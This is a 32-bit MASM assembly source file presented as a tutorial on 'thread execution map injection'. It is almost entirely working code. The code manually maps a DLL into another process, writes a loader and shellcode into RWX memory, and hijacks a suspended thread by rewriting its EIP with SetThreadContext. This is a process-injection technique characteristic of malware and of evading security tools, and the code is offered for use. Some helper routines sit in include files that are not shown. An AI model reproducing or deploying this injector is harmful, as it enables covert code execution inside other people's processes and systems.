;===================================================================================
;                 Thread Execution Map Injection Tutorial
;                          Author Tempesta 2023

;Step 1) Open target process
;Step 2) Allocate Memory in the target process for dll
;Step 3) Copy All Headers and Sections of the dll to the memory
;Step 4) Allocate new memory in the target process for dll Loader 
;Step 5) Write Loader to the process
;Step 6) Write Shellcode to process
;======================================================================================
include teb32.inc
include pe32.inc
include process32.inc
include priv.inc
include shellcode.inc
include strlen.inc
include readdll.inc

map_injector  proto :DWORD,:DWORD

.code
;==========================================================
map_injector proc uses ebx esi edi lpTarget:DWORD,dllPath:DWORD
   
    call magic_enable_privilege 
    ;-----------------
    push dllPath
    ;-----------------
    call read_dll
    ;-----------------
    mov esi,eax
    ;-----------------
    or eax,eax
    je @@Ret
    ;-----------------
    fn isvalidpe32,eax
    ;-----------------
    or eax,eax
    jne @F
    ;-----------------
    printf("\nError: Invalid PE header.\n")
    ;-----------------
    jmp @@Error
    
@@:
    mov ebx,eax        ;PE Header
    ;-----------------
    fn isdll32,eax
    ;-----------------
    or eax,eax
    jne @F
    ;-----------------
    printf("\nError: The image is not DLL.\n")
    ;-----------------
    jmp @@Error
@@:   
    ;-----------------------------
    fn get_processID,lpTarget
    ;------------------------------
    or eax,eax
    jne @F
    ;------------------------------
    printf("\nFailed to find the process\n")
    xor eax,eax
    jmp @@Ret
@@:

    ;------------------------------
    ;inject DLL into target process
    ;------------------------------
    
    push ebx                       ;phdr
    push esi                       ;dll read to buffer
    push eax                       ;pid
    ;------------------------------
    call map_inject
    ;------------------------------
    or eax,eax
    je @@Error
    ;------------------------------
    fn VirtualFree,esi, 0, MEM_RELEASE 
    ;-----------------
    xor eax,eax
    inc eax
@@Ret:
    ret
@@Error:
    fn VirtualFree,esi, 0, MEM_RELEASE 
    ;-----------------
    xor eax,eax
    jmp @@Ret
map_injector endp
;===========================================================
map_inject proc uses ebx esi edi processID:DWORD,lpInjectDll:DWORD,phdr:DWORD
    LOCAL openedProcess:DWORD
    LOCAL LoadLibraryPtr:DWORD
    LOCAL dllLen:DWORD
    LOCAL result:DWORD
    LOCAL hThread:DWORD
    LOCAL threadID:DWORD
    LOCAL ctx:CONTEXT
    LOCAL mem_loder:DWORD
    LOCAL mem_shell:DWORD
    
    and result,0
    
    ;------------------------------
    ;         OPEN PROCESS
    ;------------------------------
    
    fn open_process,processID
    ;--------------
    mov openedProcess,eax
    ;--------------
    or eax,eax
    jne @F
    ;--------------
    call GetLastError
    ;----------------
    printf("\nError: Unable to open target process handle (%d)\n",eax)
    ;------------------------------
    jmp @@Ret
    
@@:
    printf("\nAllocating memory for the DLL.\n")
    ;--------------------------------
    mov ebx,phdr
    ;---------------
    fn get_sizeOfImage32,ebx
    ;--------------------------------
    fn VirtualAllocEx,openedProcess, NULL, eax, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
    ;--------------------------------
    or eax,eax
    jne @F
    ;--------------------------------
    call GetLastError
    ;--------------------------------
    printf("\nError: Unable to allocate memory for the DLL (%d)\n", eax)
    ;--------------------------------
    jmp @@Close

@@:
    mov edi,eax                     ;pMem
    mov esi,lpInjectDll             ;pDll
    
    printf("\nMemory Allocated at address: %#x\n",eax)
    printf("Copying headers into target process.\n")
    ;--------------------------------
    
    fn get_sizeOfHeaders32,ebx
    ;--------------------------------
    fn WriteProcessMemory,openedProcess,edi,esi,eax,NULL
    ;--------------------------------
    or eax,eax
    jne @F
    ;--------------------------------
    call GetLastError
    ;--------------------------------
    printf("\nError: Unable to copy headers to target process (%d)\n", eax)
    ;--------------------------------
    fn VirtualFreeEx,openedProcess,edi,0,MEM_RELEASE
    ;--------------------------------
    jmp @@Close
@@:
    printf("\nCopying sections to target process.\n")
    ;--------------------------------
    
    push openedProcess
    ;-----------------
    call copy_sections
    
    ;--------------------------------
    printf("\nAllocating memory for the loader code.\n")
    ;--------------------------------
    
    fn VirtualAllocEx,openedProcess,NULL,4096,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE
    ;--------------------------------
    or eax,eax
    jne @F
    ;--------------------------------
    call GetLastError
    ;--------------------------------
    printf("\nError: Unable to allocate memory for the loader code (%d)\n",eax)
    ;--------------------------------
    fn VirtualFreeEx,openedProcess,edi,0,MEM_RELEASE
    ;--------------------------------
    jmp @@Close
     
@@:   
    mov mem_loder,eax
    
    ;-------------------------------
    printf("\nLoader code allocated at %#x\n",eax)
    printf("Copying Loader to target process.\n")
    ;-------------------------------
    
    push esi           ;dll_base
    push edi           ;mem_process_dll
    push mem_loder     ;mem_loader
    push openedProcess
    ;-------------------------------
    call loader_write
    ;-------------------------------

    printf("\nFinding a thread to hijack.\n")
    
    ;----------------------------------
    ;Iterate the threads of the process
    ;and get Thread id
    ;----------------------------------
    
    fn get_process_threadID,processID
    ;----------------------------------
    mov threadID,eax
    
    ;----------------------------------
    printf("\nTarget thread found. TID: %d\n",eax)
    printf("\nAllocating memory in target process for shellcode.\n")
    
    fn VirtualAllocEx,openedProcess,NULL,4096,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE
    ;----------------------------------
    or eax,eax
    jne @F
    ;----------------------------------
    fn GetLastError
    ;----------------------------------
    printf("\nError: Unable to allocate memory in target process (%d)",eax)
    ;----------------------------------
    jmp @@Close
@@:  
    mov mem_shell,eax
    
    ;---------------------------------
    printf("\nMemory allocated at %#x\n",eax)
    printf("\nOpening target thread handle.\n")
    
    ;-----------------------------
    ;        Open the thread
    ;-----------------------------
   
    fn OpenThread,THREAD_ALL_ACCESS,FALSE,threadID
    ;---------------
    mov hThread,eax
    or eax,eax
    jne @F
    ;-----------------------------
    call GetLastError
    ;-----------------------------
    printf("\nError: Unable to open target thread handle (%d)\n",eax)
    ;-----------------------------
    fn VirtualFreeEx,openedProcess,mem_shell,0,MEM_RELEASE
    ;-----------------------------
    jmp @@Close
@@:
    printf("\nSuspending the target thread.\n")
    
    ;-----------------------------
    ;      Suspend the thread
    ;-----------------------------
    
    fn SuspendThread,hThread
    
    printf("\nGetting thread context.\n")
    
    ;-----------------------------
    ;Get the thread’s registers
    ;-----------------------------
    
    mov ctx.ContextFlags,CONTEXT_FULL
    ;-----------------------------
    fn GetThreadContext,hThread, addr ctx
    ;-----------------------------
    or eax,eax
    jne @F
    ;-----------------------------
    call GetLastError
    ;-----------------------------
    printf("\nError: Unable to get the thread context of target thread (%d)\n",eax)
    ;-----------------------------
    fn VirtualFreeEx,openedProcess,mem_shell,0,MEM_RELEASE
    ;-----------------------------
    fn ResumeThread,hThread
    ;-----------------------------
    jmp @@Close
    
@@:
    printf("\nCurrent eip value: %#x\n",ctx.regEip)
    printf("\nSetup the shellcode...\n")
    
    ;-----------------------------
    ;     Setup shellcode
    ;-----------------------------
    
    push ctx.regEip
    push mem_loder
    ;-----------------------------
    call shellcode_setup
    ;-----------------------------
    mov esi,eax
    mov edi,mem_shell

    printf("\nWriting shellcode into target process.\n")
    ;----------------------------
    mov edx,shellsize
    ;----------------------------
    fn WriteProcessMemory,openedProcess,edi,esi,edx,NULL
    ;----------------------------
    or eax,eax
    jne @F
    ;----------------------------
    call GetLastError
    ;----------------------------
    printf("\nError: Unable to write shellcode into target process (%d)\n",eax)
    ;----------------------------
    jmp @@Error
@@:
     ;------------------------
     ;Set EIP to the shellcode
     ;------------------------
    
     mov ctx.regEip,edi
     ;------------------------
     printf("\nNew eip value: %#x\n",edi)
     ;------------------------
     printf("\nHijacking target thread.\n")
     
     ;-------------------------
     ;Hijack the thread
     ;-------------------------
     
     fn SetThreadContext,hThread,addr ctx
     ;-------------------------
     or eax,eax
     jne @F
     ;--------------------------
     call GetLastError
     ;--------------------------
     printf("\nError: Unable to hijack target thread (%d)\n",eax)
     ;--------------------------
     jmp @@Error
@@:
     ;---------------------
     printf("\nResuming target thread.\n")
     ;---------------------
     fn ResumeThread,hThread
     ;---------------------
     fn CloseHandle,hThread
     fn CloseHandle,openedProcess
     ;----------------------
     fn VirtualFree,esi,0,MEM_RELEASE
     ;--------------------------
     mov result,1
@@Ret:
     push result
     pop eax
	 ret
@@Close:
    fn CloseHandle,openedProcess
    ;---------------------
    jmp @@Ret
@@Error:
     fn VirtualFreeEx,openedProcess,edi,0,MEM_RELEASE
     ;--------------------------
     fn ResumeThread,hThread
     fn CloseHandle,hThread
     fn CloseHandle,openedProcess
     fn VirtualFree,esi,0,MEM_RELEASE
     ;--------------------------
     jmp @@Ret
map_inject endp
;==========================================================
;EBX ==> PHDR; EDI ==> pMem ; ESI ==> DLL
;==========================================================
copy_sections proc uses ebx esi edi hProcess:DWORD
    LOCAL i:DWORD
    LOCAL n:DWORD
    
    and i,0
    ;--------------------
    fn get_numberOfSections32,ebx
    ;--------------------
    mov n, eax
    ;--------------------
    add ebx,0F8h                   ;section hdr
@@For:
    push 0
    ;-------------------
    mov eax,dword ptr[ebx+10h]     ;+10 SizeOfRawData
    push eax
    ;--------------------
    mov eax,dword ptr[ebx+14h]     ;+14 PointerToRawData
    add eax,esi                    ;dll base
    push eax                       ;src
    ;--------------------
    mov eax,dword ptr[ebx+0Ch]     ;+0C VirtualAddress
    add eax,edi                    ;memory
    push eax                       ;dest
    ;-------------------
    push hProcess
    ;-------------------
    call WriteProcessMemory
    ;-------------------
    add ebx,40
    add i,1
    mov eax,i
    cmp eax,n
    jl @@For
    
	ret
copy_sections endp
;==========================================================